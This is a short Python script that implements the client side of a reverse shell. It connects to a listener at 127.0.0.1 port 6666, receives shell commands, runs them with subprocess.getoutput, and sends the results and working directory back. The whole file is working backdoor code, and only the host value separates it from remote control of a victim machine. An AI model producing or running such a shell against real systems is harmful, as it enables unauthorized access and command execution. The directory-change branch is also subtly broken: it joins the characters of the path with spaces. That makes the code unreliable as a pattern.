import socket
import os
import subprocess

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 6666  # Port to listen on (non-privileged ports are > 1023)
BUFFER_SIZE = 1024*128
SEPARATOR = "<sep>"

server = socket.socket()

server.connect((HOST,PORT))

cwd = os.getcwd()
server.send(cwd.encode())

while True:
    # receive the command from the server
    command = server.recv(BUFFER_SIZE).decode()
    print(command)
    splited_command = command.split()
    if command == "exit":
        print('exit')
        break    
    if splited_command[0] == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = "Change succes !"
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    server.send(message.encode())

server.close()